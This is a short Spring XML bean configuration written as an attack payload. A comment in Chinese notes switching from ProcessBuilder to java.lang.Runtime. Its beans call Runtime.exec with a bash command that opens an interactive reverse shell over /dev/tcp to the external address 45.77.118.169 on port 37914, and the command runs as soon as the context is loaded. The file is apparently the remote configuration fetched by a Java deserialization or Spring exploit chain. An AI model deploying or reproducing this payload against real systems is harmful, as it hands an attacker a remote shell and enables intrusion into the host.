<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">

    <!-- 放弃使用 ProcessBuilder Bean，改用更加底层的 java.lang.Runtime -->
    <bean id="exec_999" class="java.lang.Runtime" factory-method="getRuntime">
    </bean>

    <bean id="run_cmd_999" factory-bean="exec_999" factory-method="exec">
        <constructor-arg>
            <list>
                <value>bash</value>
                <value>-c</value>
                <value>bash -i &gt;&amp; /dev/tcp/45.77.118.169/37914 0&gt;&amp;1</value>
            </list>
        </constructor-arg>
    </bean>
</beans>
